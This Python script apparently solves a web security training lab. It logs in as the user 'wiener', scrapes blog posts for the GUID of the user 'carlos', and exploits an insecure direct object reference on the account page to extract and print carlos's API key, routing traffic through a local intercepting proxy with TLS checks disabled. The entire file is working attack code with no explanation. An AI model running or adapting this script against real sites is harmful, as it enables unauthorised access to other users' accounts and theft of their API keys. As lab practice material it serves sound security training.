import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})["value"]
    return csrf

def carlos_guid(session, url):
    # Load home page
    res = requests.get(url, verify=False, proxies=proxies)
    post_ids = re.findall(r"postId=(\w+)\"", res.text)
    unique_post_ids = list(set(post_ids))

    # Loop through post ids and identify which one is written by Carlos
    for id in unique_post_ids:
        res = session.get(url + f"/post/?postId={id}", verify=False, proxies=proxies)
        if "carlos" in res.text:
            print("(+) Found carlos GUID...")
            guid = re.findall(r"userId=(.*)'", res.text)[0]
            return guid
        else:
            print("(-) Could not find carlos GUID...")

def carlos_api_key(session, url):
    # Get CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)

    # Login in as wiener peter
    login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
    res = session.post(login_url, data=login_data, verify=False, proxies=proxies)

    if "Log out" in res.text:
        print("(+) Successfully logged in as the wiener user.")

        # Obtain carlos's GUID
        guid = carlos_guid(session, url)

        # Obtain carlos's API key 
        carlos_account_ul = url + f"/my-account?id={guid}"
        res = session.get(carlos_account_ul, verify=False, proxies=proxies)
        if "carlos" in res.text:
            print("(+) Successfully accessed carlos's account")
            print("(+) Retrieving API Key...")
            api_key = re.findall(r"Your API Key is: (.*)</div>", res.text)[0]
            print(f"(+) API Key is: {api_key}")
        else:
            print("(-) Could access the carlos's account.")
            sys.exit(-1)
    else:
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} <url>")
        print(f"(+) Example: python {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.session()
    url = sys.argv[1].strip()
    carlos_api_key(session, url)

if __name__ == "__main__":
    main()